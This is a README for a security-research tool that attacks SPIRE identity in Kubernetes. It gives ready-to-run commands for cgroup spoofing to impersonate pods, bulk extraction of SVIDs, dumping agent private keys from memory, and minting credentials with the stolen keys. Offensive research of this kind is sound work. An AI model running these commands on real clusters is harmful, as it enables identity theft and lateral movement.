
[![GitHub release][release-img]][release] 
[![License][license-img]][license] 
[![Go version][shield-go-version]][go-version] 
![Stars](https://img.shields.io/github/stars/PaloAltoNetworks/spooffe) 
![Downloads][download] 


<img  align="right" width="300" height="300" alt="spooffe_logo" src="https://github.com/user-attachments/assets/c8b08b86-b257-4da6-a4c0-324d50b8099d" />

 
**Spooffe** is a security research and penetration testing tool that demonstrates multiple attack techniques against SPIRE deployments in Kubernetes environments.

This is a **post-exploitation technique** that requires prior access to a Kubernetes node. The tool supports:

- **Workload Impersonation (Cgroup Spoofing)**: SPIRE agents attest workloads by inspecting their cgroup paths. Spooffe exploits this by creating fake cgroup paths that mimic legitimate containers, allowing extraction of their identity credentials (JWT and X.509 SVIDs).

- **Agent Impersonation**: Extract SPIRE agent private keys from memory to impersonate the agent itself, enabling direct communication with the SPIRE server.

- **SPIRE Agent API Access**: Interact with agent APIs including Workload API, Delegated Identity API, and debug endpoints.

- **SPIRE Server API Access**: Use stolen agent credentials to call server APIs for minting SVIDs, listing entries, and managing trust bundles.

---

## Features

| Feature | Description |
|---------|-------------|
| 🎭 **Cgroup Spoofing** | Create fake cgroup paths to impersonate container identities |
| 🔐 **SVID Extraction** | Extract JWT and X.509 SVIDs from any container on the node |
| 🔍 **Container Discovery** | Multiple discovery methods: sysfs, proc, CRI |
| 🤖 **Agent API Access** | Debug info, Workload API, Delegated Identity API |
| 🖥️ **Server API Access** | Mint SVIDs, list entries, manage bundles |
| ⚡ **Concurrent Operations** | Parallel SVID fetching for performance |
| 🎫 **Agent Attestation** | Perform PSAT-based agent attestation |
| 🔑 **Memory Extraction** | Dump agent private keys from memory |

---

## Build and Installation

### Prerequisites

| Requirement | Notes |
|-------------|-------|
| Go 1.21+ | For building from source |
| Linux | Required for cgroup manipulation |
| Root privileges | For cgroup access and CRI discovery |
| SPIRE Agent | Running on the target node |

### Build from Source

```bash
# Clone the repository
git clone https://github.com/cyberark/spooffe.git
cd spooffe

# Build with make
make build
make build-linux        # Linux amd64
make build-linux-arm64  # Linux arm64
make build-debug        # With Debug symbols

# Verify installation
./spooffe version
```

### Dependencies

```bash
# Download dependencies
go mod download

# Tidy dependencies
go mod tidy

# Verify dependencies
go mod verify
```


## Usage

### Quick Start

```bash
# 1. List all containers on the node
sudo ./spooffe list --source cri --wide

# 2. Dump SVIDs from all containers
sudo ./spooffe dump --concurrent

# 3. Check extracted SVIDs
ls -la SVIDs2/
```

### Common Workflows

#### Extract All SVIDs from a Node

```bash
# Discover containers and extract all SVIDs
sudo ./spooffe dump --jwt --x509 --concurrent --output both
```

#### Target a Specific Container

```bash
# First, list containers to get the pod UID and container ID
sudo ./spooffe list --source cri --wide

# Then spoof and fetch manually
sudo ./spooffe spoof --pod <pod-uid> --container <container-id>
```

#### Perform Agent Impersonation

```bash
# Extract agent credentials from memory
sudo ./spooffe dump agentkey --key-type ec

# Use extracted credentials to mint SVIDs from server
sudo ./spooffe server collect-jwts \
  --server-address "server:8081" \
  --client-cert agent.crt \
  --client-key agent_ec.key \
  --ca-cert bundle.crt \
  --audience "target-service"
```


## Commands

### `list` - Container Discovery

Discover containers on the node using multiple methods.

```bash
# Using sysfs (default, lightweight)
./spooffe list

# Using CRI (most accurate, requires root)
sudo ./spooffe list --source cri --wide

# Using proc filesystem
./spooffe list --source proc --verbose
```

| Flag | Default | Description |
|------|---------|-------------|
| `--source` | `sysfs` | Discovery method: `sysfs`, `proc`, `cri` |
| `--wide`, `-w` | `false` | Show additional columns |
| `--verbose`, `-v` | `false` | Verbose output |
| `--no-trunc` | `false` | Don't truncate long fields |


### `dump` - SVID Extraction

Extract SVIDs from all discovered containers via cgroup spoofing.

```bash
# Dump all SVIDs
sudo ./spooffe dump

# Dump only JWT SVIDs concurrently
sudo ./spooffe dump --jwt --concurrent

# Custom socket and timeout
sudo ./spooffe dump --socket /run/spire/sockets/agent.sock --timeout 30
```

| Flag | Default | Description |
|------|---------|-------------|
| `--jwt` | `false` | Fetch JWT-SVIDs only |
| `--x509` | `false` | Fetch X.509-SVIDs only |
| `--concurrent` | `false` | Enable parallel fetching |
| `--source` | `sysfs` | Container discovery method |
| `--socket`, `-s` | `/run/spire/sockets/agent.sock` | SPIRE agent socket |
| `--timeout` | `10` | Timeout in seconds |
| `--output` | `both` | Output mode: `print`, `save`, `both` |

#### `dump agentkey` - Agent Key Extraction

Extract SPIRE agent private keys from process memory.

```bash
sudo ./spooffe dump agentkey --key-type ec --output ./extracted
```

| Flag | Default | Description |
|------|---------|-------------|
| `--pid`, `-p` | auto | Target spire-agent PID |
| `--output`, `-o` | `.` | Output directory |
| `--key-type` | `both` | Key type: `rsa`, `ec`, `both` |
| `--key-only` | `false` | Skip bundle extraction |
| `--bundle-only` | `false` | Skip key extraction |


### `spoof` - Manual Cgroup Spoofing

Manually spoof a cgroup for a specific container.

```bash
sudo ./spooffe spoof --pod <pod-uid> --container <container-id>
```

| Flag | Required | Description |
|------|----------|-------------|
| `--pod` | ✅ | Pod UID |
| `--container` | ✅ | Container ID |


### `agent` - SPIRE Agent APIs

Interact with SPIRE agent APIs.

```bash
# Get debug information
./spooffe agent debug --socket unix:///tmp/spire/sockets/admin.sock

# Fetch X.509 SVID via Workload API
./spooffe agent fetch x509 --out-cert cert.pem --out-key key.pem

# Perform PSAT attestation
sudo ./spooffe agent attest \
  --psat-token /var/run/secrets/tokens/spire-agent \
  --ca-cert bundle.crt \
  --cluster my-cluster \
  --server-address server:8081

# Delegated identity API
./spooffe agent delegate fetchjwt --pid 12345 --audience example.org
```

> **Note on `agent attest`**:  While this is the official API for obtaining agent SVIDs, it's impractical for agent impersonation when an agent already exists. The API successfully issues a new SVID, but it becomes unusable within seconds due to a serial number race condition caused by the legitimate agent's continuous rotation cycle. When the agent rotates (typically every few minutes), it updates the database with a new serial number, causing the SVID to be rejected with "Agent SVID is not active" errors. Therefore, extracting the agent key from memory (via `dump agentkey`) is typically the more practical approach for agent impersonation. 

### `server` - SPIRE Server APIs

Interact with SPIRE server APIs (requires agent credentials).

```bash
# Common flags for all server commands
SERVER_FLAGS="--server-address server:8081 --ca-cert bundle.crt \
  --client-cert agent.crt --client-key agent.key"

# Mint a single JWT-SVID
./spooffe server jwt $SERVER_FLAGS --entry-id <id> --audience aud1

# Collect all JWT-SVIDs
./spooffe server collect-jwts $SERVER_FLAGS --audience target-service

# Collect all X.509-SVIDs
./spooffe server collect-x509 $SERVER_FLAGS

# List authorized entries
./spooffe server entries $SERVER_FLAGS --format table

# Get trust bundle
./spooffe server bundle $SERVER_FLAGS --format pem --output bundle.crt

# Renew agent SVID
./spooffe server renew $SERVER_FLAGS
```

## How It Works

### Cgroup Spoofing Attack

```
┌─────────────────────────────────────────────────────────────────┐
│                     Kubernetes Node                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────┐     ┌──────────────┐     ┌──────────────┐     │
│  │  Container A │     │  Container B │     │   Spooffe    │     │
│  │  (Legit Pod) │     │  (Legit Pod) │     │  (Attacker)  │     │
│  └──────┬───────┘     └──────┬───────┘     └──────┬───────┘     │
│         │                    │                    │             │
│         │ Real cgroup        │ Real cgroup        │ Fake cgroup │
│         │                    │                    │             │
│         ▼                    ▼                    ▼             │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │                    SPIRE Agent                          │    │
│  │  • Reads /proc/<pid>/cgroup                             │    │
│  │  • Extracts pod UID and container ID                    │    │
│  │  • Issues SVID if selectors match registration entry    │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Fake Cgroup Structure

Spooffe creates cgroup paths matching Kubernetes patterns:

```
/sys/fs/cgroup/kubepods.slice.FAKE/
└── kubepods-burstable-pod<POD_UID>.slice/
    └── cri-containerd-<CONTAINER_ID>.scope/
        └── cgroup.procs  ← Spooffe PID written here
```


## Troubleshooting

| Issue | Solution |
|-------|----------|
| `Permission denied` | Run with `sudo` |
| `Socket connection failed` | Verify SPIRE agent socket path with `--socket` |
| `No containers found` | Try different source: `--source cri` |
| `Timeout` | Increase with `--timeout 30` |
| `No private keys found` | Ensure targeting correct spire-agent PID |
| `Can't find server address` | In Kubernetes, get the server address from services: `kubectl get svc -n spire`. Use the NodePort (e.g., `192.168.109.131:32595`) when running from the host. Note: The port may vary between deployments. |


## License  

Copyright (c) 2026 CyberArk Software Ltd. All rights reserved  
This repository is licensed under <COMPLETE> - see LICENSE for more details.

## Disclaimer

This tool is provided for **educational and authorized security testing purposes only**. Users are responsible for ensuring compliance with applicable laws and regulations. Unauthorized access to computer systems is illegal.


## Share Your Thoughts And Feedback
For more comments, suggestions or questions, you can contact Eviatar Gerzi ([@g3rzi](https://twitter.com/g3rzi)) from Unit 42.

[release-img]: https://img.shields.io/github/release/PaloAltoNetworks/spooffe.svg
[release]: https://github.com/PaloAltoNetworks/spooffe/releases

[license-img]: https://img.shields.io/github/license/PaloAltoNetworks/spooffe.svg
[license]: https://github.com/PaloAltoNetworks/spooffe/blob/master/LICENSE

[shield-go-version]: https://img.shields.io/github/go-mod/go-version/PaloAltoNetworks/spooffe
[go-version]: https://github.com/PaloAltoNetworks/spooffe/blob/master/go.mod

[download]: https://img.shields.io/github/downloads/PaloAltoNetworks/spooffe/total?logo=github
